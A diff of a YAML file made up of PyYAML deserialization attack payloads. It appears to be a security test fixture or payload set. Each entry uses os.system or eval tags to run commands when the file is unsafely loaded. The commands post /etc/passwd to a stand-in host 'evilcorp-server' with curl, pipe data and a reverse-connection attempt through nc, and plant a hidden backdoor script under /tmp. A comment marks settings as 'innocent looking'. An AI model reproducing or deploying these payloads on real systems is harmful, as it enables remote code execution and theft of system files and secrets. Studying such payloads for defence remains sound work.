@@ -51,33 +51,21 @@ http_exfiltration: !!python/object/apply:os.system
 passwd_theft: !!python/object/apply:os.system  
   - "cat /etc/passwd | curl -X POST http://evilcorp-server:8888/sensitive_data --data-binary @-"
 
-# Attack 4: Netcat reverse connection
-netcat_callback: !!python/object/apply:os.system
-  - "echo 'YAML reverse shell attempt' | nc evilcorp-server 5555"
-
-# Attack 5: System reconnaissance 
+# Attack 4: System reconnaissance 
 system_recon: !!python/object/apply:os.system
   - "id > /tmp/yaml_id_output.txt"
 
-# Attack 6: Environment variable extraction
-env_extract: !!python/object/apply:os.system
-  - "env | grep -E '(USER|HOME|PATH)' | nc evilcorp-server 5555"
-
-# Attack 7: File listing and exfiltration
-file_listing: !!python/object/apply:os.system
-  - "find /home -maxdepth 2 -type f -name '*.txt' 2>/dev/null | head -10 | nc evilcorp-server 5555"
-
-# Attack 8: Hostname theft
-hostname_theft: !!python/object/apply:os.system
-  - "hostname | nc evilcorp-server 5555"
-
-# Attack 9: Create backdoor
+# Attack 5: Create backdoor
 backdoor_creation: !!python/object/apply:os.system
-  - "mkdir -p /tmp/.hidden && echo '#!/bin/bash\necho backdoor created' > /tmp/.hidden/backdoor.sh"
+  - "mkdir -p /tmp/.hidden && echo '#!/bin/sh\necho backdoor created' > /tmp/.hidden/backdoor.sh"
 
-# Attack 10: Simple eval attack
+# Attack 6: Simple eval attack
 eval_attack: !!python/object/apply:eval
   - "__import__('os').system('echo YAML_EVAL_ATTACK > /tmp/yaml_eval.txt')"
+
+# Attack 7: Netcat reverse connection
+netcat_callback: !!python/object/apply:os.system
+  - "echo 'YAML reverse shell attempt' | nc evilcorp-server 5555"
 
 # Validation settings (innocent looking)
 validation:
